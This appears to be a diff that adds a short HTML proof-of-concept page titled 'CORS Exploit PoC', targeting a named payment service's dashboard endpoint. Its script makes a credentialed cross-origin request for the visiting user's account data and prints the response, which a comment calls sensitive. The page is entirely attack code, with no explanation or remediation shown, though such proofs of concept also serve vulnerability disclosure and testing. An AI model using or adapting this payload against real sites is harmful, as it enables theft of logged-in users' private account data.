@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>CORS Exploit PoC</h1>
+    <script>
+        fetch('https://app.squareup.com/dashboard/current-user-data', {
+            method: 'GET',
+            credentials: 'include'
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log(data);  // Display sensitive data
+        });
+    </script>
+</body>
+</html>
